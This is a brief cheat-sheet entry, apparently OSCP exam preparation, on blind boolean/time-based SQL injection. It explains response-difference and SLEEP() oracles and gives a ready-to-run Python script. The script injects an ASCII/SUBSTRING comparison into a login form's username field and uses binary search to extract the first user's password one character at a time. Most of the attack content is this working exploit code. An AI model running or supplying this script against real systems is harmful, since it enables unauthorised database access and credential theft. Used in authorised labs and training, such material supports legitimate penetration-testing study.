# 05.01 Blind Boolean Time SQLi

> Extract data one char at a time using `SUBSTRING`+`ASCII` comparisons against a response-diff or `SLEEP()` oracle.

## Overview

When output is hidden, use a truthy/falsy oracle: response differs OR delay introduced. Extract one character at a time via SUBSTRING + ASCII comparisons.

## Steps

- **Confirm oracle** — pick payloads that produce reliable diff.
- **Loop per character** — `ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),i,1)) > N`.
- **Binary search** speeds up vs char-by-char enumeration.
- **Use Python** — sqlmap is faster, but blind enum is core OSCP skill.

## Commands

### Manual blind in Python

```python
import requests, string
T='http://<TARGET>/login.php'
out=''
for i in range(1,33):
  lo,hi=32,126
  while lo<=hi:
    m=(lo+hi)//2
    p={'u': f"admin' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{i},1))>{m}-- -",'p':'x'}
    if 'Welcome' in requests.post(T,data=p).text: lo=m+1
    else: hi=m-1
  if lo==32: break
  out+=chr(lo); print(out)
```
